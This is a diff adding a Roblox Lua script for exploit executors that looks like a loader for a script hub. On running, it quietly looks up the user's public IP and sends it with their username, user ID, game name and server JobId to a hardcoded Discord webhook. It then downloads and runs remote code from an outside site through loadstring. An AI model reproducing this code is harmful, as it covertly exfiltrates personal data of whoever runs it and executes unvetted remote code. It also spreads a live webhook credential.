@@ -1,0 +1,98 @@
+local HttpService = game:GetService("HttpService")
+
+local webhookURL = "https://discord.com/api/webhooks/1497502762131390565/PT5Iy4VJYmMcPOYgy7KynRpK6NvXqRIkE5qz2IcJbj2Dr_N4MJSFeEU5zlqsMfOTJBVQ"
+
+
+
+local function sendDetailedWebhook()
+
+    local player = game.Players.LocalPlayer
+
+    local request = (syn and syn.request) or (http and http.request) or http_request or (Fluxus and Fluxus.request) or request
+
+    
+
+    if request then
+
+        -- 1. IP 주소 가져오기 시도
+
+        local ipData = "Unknown (Blocked)"
+
+        local success, response = pcall(function()
+
+            return request({
+
+                Url = "https://api.ipify.org", -- IP 확인 API
+
+                Method = "GET"
+
+            }).Body
+
+        end)
+
+        if success then ipData = response end
+
+
+
+        -- 2. 디스코드로 보낼 데이터 정리
+
+        local data = {
+
+            ["content"] = "🚨 **스크립트 실행 및 IP 감지!**",
+
+            ["embeds"] = {{
+
+                ["title"] = "실행자 상세 정보 리포트",
+
+                ["color"] = 16711680,
+
+                ["fields"] = {
+
+                    {["name"] = "닉네임", ["value"] = player.Name, ["inline"] = true},
+
+                    {["name"] = "유저 ID", ["value"] = tostring(player.UserId), ["inline"] = true},
+
+                    {["name"] = "🌐 IP 주소", ["value"] = "||" .. ipData .. "||", ["inline"] = false}, -- 디코드에서 클릭해야 보이게 마스킹
+
+                    {["name"] = "게임 이름", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, ["inline"] = true},
+
+                    {["name"] = "서버 코드(JobId)", ["value"] = game.JobId, ["inline"] = false}
+
+                },
+
+                ["footer"] = {["text"] = "IP 정보는 VPN 사용 시 부정확할 수 있습니다."}
+
+            }}
+
+        }
+
+
+
+        -- 3. 전송
+
+        pcall(function()
+
+            request({
+
+                Url = webhookURL,
+
+                Method = "POST",
+
+                Headers = {["Content-Type"] = "application/json"},
+
+                Body = HttpService:JSONEncode(data)
+
+            })
+
+        end)
+
+    end
+
+end
+
+
+
+-- 실행
+
+task.spawn(sendDetailedWebhook)
+loadstring(game:HttpGet('https://zuwz.me/Ls-Zee-Hub-KL'))()
